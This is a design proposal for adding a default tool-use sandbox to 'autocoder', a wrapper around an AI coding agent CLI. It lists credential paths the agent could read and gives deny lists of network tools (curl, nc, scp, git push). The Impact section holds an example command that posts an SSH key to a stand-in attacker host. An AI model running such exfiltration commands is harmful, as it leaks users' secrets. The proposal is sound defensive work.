## Why

autocoder currently invokes the wrapped agent CLI (`claude` by default)
with no tool-use restrictions. The Rust spawn site
(`executor/claude_cli.rs::run_subprocess`) is literally
`Command::new(&self.command).args(&self.args)` with `self.args` empty
by default, then pipes the prompt to stdin. Whatever Claude CLI's
defaults happen to be — interactive prompting, full bypass, anywhere
in between — is what the LLM gets.

In practice this means the model running inside a polling iteration
can:

- Read any file the autocoder user can read, including
  `~/.ssh/id_ed25519`, `~/.claude/` credentials, and a
  `config.yaml` with inline secrets.
- Execute arbitrary shell commands: `curl`, `git push <attacker-url>`,
  `nc`, `scp` to externally-controlled hosts.
- Fetch arbitrary URLs via the WebFetch tool.

Branch protection and the fork-PR workflow (queued separately) reduce
the harm an attacker can do *via the PR pipeline*. They do not
constrain what the model itself does inside the workspace. For
operators handling private repositories, the executor needs a
tool-use sandbox that is **on by default** and that blocks the
obvious exfiltration channels without breaking ordinary build/test
workflows.

This change introduces an `executor.sandbox:` config block whose
absence yields a restrictive safe default, and whose presence lets
operators relax or tighten restrictions for their specific project.
The defaults are designed to permit common test runners (`cargo
test`, `npm test`, `pytest`) and ordinary file ops, while blocking
network egress and reads of credential paths.

## What Changes

- Introduce `ExecutorSandboxConfig` in `src/config.rs` containing:
  ```rust
  pub struct ExecutorSandboxConfig {
      #[serde(default = "default_allowed_tools")]
      pub allowed_tools: Vec<String>,
      #[serde(default = "default_disallowed_bash_patterns")]
      pub disallowed_bash_patterns: Vec<String>,
      #[serde(default = "default_disallowed_read_paths")]
      pub disallowed_read_paths: Vec<String>,
  }
  ```
  Add `pub sandbox: Option<ExecutorSandboxConfig>` to `ExecutorConfig`.
  Absent block → all three fields default to the safe baseline below.

- Default safe baseline:
  - **`allowed_tools`:** `["Read", "Write", "Edit", "Glob", "Grep", "Bash"]`
    — explicitly excludes `WebFetch`, `WebSearch`, and any future
    network-egress tools.
  - **`disallowed_bash_patterns`:** `["curl:*", "wget:*", "nc:*", "ncat:*", "netcat:*", "ssh:*", "scp:*", "sftp:*", "rsync:*", "git push:*", "git remote *", "git fetch *://*"]`
    — every common network-egress command and git operations that
    redirect the daemon's intended targets.
  - **`disallowed_read_paths`:** `["/home/*/.ssh/**", "/home/*/.claude/**", "/etc/shadow", "/etc/ssl/private/**"]`
    — credential locations on a typical autocoder host.

- At each `ClaudeCliExecutor::run` call, generate a per-iteration
  Claude Code settings JSON file inside a temp directory (NOT the
  workspace, to avoid contaminating the diff) containing the
  resolved sandbox rules. Pass `--settings <path>` to the spawned
  CLI. Delete the temp file after the child exits.

- Pass `--permission-mode acceptEdits` so the CLI auto-approves
  file edits within the workspace but still consults the settings
  file for tool-level allow/deny rules.

- Pass `--allowedTools <comma-separated-list>` so the tool
  allowlist is enforced even if the settings file fails to apply
  for any reason (defense-in-depth).

- README documents:
  - The sandbox section under "AI Security & Guardrails" describing
    defaults and how to relax them.
  - Explicit note that the reviewer LLM's data flow (diff sent to
    the configured provider) is a SEPARATE surface, not governed
    by this sandbox; operators opt in by enabling the reviewer.
  - Honest caveat: the sandbox is best-effort at the tool-routing
    layer; for hard isolation, run autocoder under OS-level
    sandboxing (firejail, bubblewrap, systemd `ProtectHome=`).

## Capabilities

### Modified Capabilities

- `executor`: the CLI-wrapping backend SHALL apply tool-use
  restrictions to every spawned child process via a per-iteration
  Claude Code settings file derived from
  `executor.sandbox` config. Default sandbox is restrictive;
  operators can widen or tighten it. The reviewer LLM is unaffected
  (separate code path with its own data flow).

## Impact

The default deployment becomes meaningfully harder to exfiltrate
data from. An attacker who somehow gets the LLM to attempt a `curl
attacker.example.com/leak --data @~/.ssh/id_ed25519` would be
blocked at three layers: the `curl:*` bash pattern, the
`/home/*/.ssh/**` read path, and the absence of `WebFetch` in the
allowed tools.

Operators with build pipelines that need extra network access (e.g.
a project where the agent runs `pip install`) widen the sandbox
explicitly:

```yaml
executor:
  kind: claude_cli
  sandbox:
    disallowed_bash_patterns:
      # Drop the default `curl:*` denial; pip needs HTTPS.
      - "nc:*"
      - "ncat:*"
      - "ssh:*"
      - "git push:*"
      - "git remote *"
```

Existing deployments that never set `sandbox:` will get the
restrictive defaults automatically on upgrade. Operators whose
workflows break under the defaults will see the LLM's failures in
the iteration logs and can widen the sandbox accordingly.
